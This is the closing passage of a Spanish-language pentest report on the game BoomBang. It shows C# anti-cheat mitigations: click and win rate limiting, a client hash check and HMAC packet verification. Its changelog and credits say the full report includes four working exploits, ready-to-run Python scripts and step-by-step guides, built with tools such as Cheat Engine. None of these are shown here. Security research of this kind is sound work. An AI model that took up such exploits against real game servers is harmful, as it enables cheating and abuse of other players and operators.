public class ClickRateLimiter
{
    private Dictionary<int, Queue<DateTime>> playerClicks = new Dictionary<int, Queue<DateTime>>();
    private const int MAX_CLICKS_PER_SECOND = 20;

    public bool IsClickAllowed(int userId)
    {
        if (!playerClicks.ContainsKey(userId))
            playerClicks[userId] = new Queue<DateTime>();

        var clicks = playerClicks[userId];
        var now = DateTime.Now;

        // Remover clicks antiguos (>1 segundo)
        while (clicks.Count > 0 && (now - clicks.Peek()).TotalSeconds > 1)
            clicks.Dequeue();

        // Verificar límite
        if (clicks.Count >= MAX_CLICKS_PER_SECOND)
        {
            LogSuspiciousActivity(userId, "Click rate exceeded");
            return false;
        }

        clicks.Enqueue(now);
        return true;
    }
}
```

### 3. Checksums del Cliente

```csharp
// Verificar integridad del .swf
public bool ValidateClientHash(Session session, string clientHash)
{
    const string EXPECTED_HASH = "a1b2c3d4e5f6...";  // SHA256 de Kernel.swf original

    if (clientHash != EXPECTED_HASH)
    {
        Log.Warning($"Modified client detected for user {session.User.id}");
        session.SendData(new ServerMessage(new byte[] { 1, 0 }));  // Kick
        return false;
    }

    return true;
}
```

### 4. Encriptación de Paquetes

```csharp
// Usar HMAC para verificar integridad de paquetes
public bool VerifyPacketIntegrity(byte[] packet, byte[] signature)
{
    using (var hmac = new HMACSHA256(SERVER_SECRET_KEY))
    {
        var computedHash = hmac.ComputeHash(packet);
        return computedHash.SequenceEqual(signature);
    }
}
```

### 5. Rate Limiting Global

```csharp
// Limitar partidas ganadas por hora
public class WinRateLimiter
{
    private const int MAX_WINS_PER_HOUR = 5;

    public bool CanClaimReward(int userId)
    {
        var recentWins = GetRecentWins(userId, TimeSpan.FromHours(1));

        if (recentWins >= MAX_WINS_PER_HOUR)
        {
            Log.Warning($"User {userId} exceeded win rate limit");
            return false;
        }

        return true;
    }
}
```

---

## 📝 Changelog

- **v1.0.0** (2025-01-XX): Versión inicial
  - Análisis completo de vulnerabilidades
  - 4 exploits funcionales documentados
  - Scripts Python listos para ejecutar
  - Guías paso a paso para cada exploit

---

## 👥 Créditos

**Investigación**: Equipo de Pentesting BoomBang
**Análisis de Código**: Deobfuscación completa de Kernel.swf (901 archivos .as)
**Scripts**: Python 3.7+, ActionScript 3
**Herramientas**: JPEXS, Wireshark, Cheat Engine, PyAutoGUI

---

## 📧 Contacto

Para reportar vulnerabilidades adicionales o consultas de pentesting:
- **Email**: security@boombang-pentesting.local
- **GitHub**: /boombang-security-research

---

**⚠️ DISCLAIMER FINAL**: Este documento es únicamente para fines educativos y de investigación en seguridad. El uso de estos exploits en servidores públicos sin autorización expresa es ilegal. Los autores no se responsabilizan por el mal uso de esta información.

---

**🔒 USO RESPONSABLE - PENTESTING AUTORIZADO ÚNICAMENTE**
